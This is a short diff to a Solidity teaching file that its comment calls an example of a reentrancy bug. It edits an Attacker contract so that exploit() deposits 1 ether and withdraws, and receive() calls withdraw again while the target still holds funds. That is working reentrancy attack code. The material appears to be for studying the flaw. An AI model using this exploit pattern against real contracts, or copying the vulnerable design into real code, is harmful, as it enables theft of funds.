@@ -3,7 +3,6 @@ pragma solidity ^0.8.13;
 
 /* 
 * @dev This contracts includes an example of a reentrancy bug.
-
 */
 
 contract Example2 {
@@ -38,12 +37,14 @@ contract Attacker {
 	}
 	
 	function exploit() external payable {
-		target.deposit{value: msg.value}();
+		target.deposit{value: 1 ether}();
 		target.withdraw();
 	}
 	
 	receive() external payable {
-		target.withdraw();
+		if (target.banksBalance() > 1 ether) {
+			target.withdraw();
+		}
 	}
 	
 	function getBalance() public view returns (uint256) {
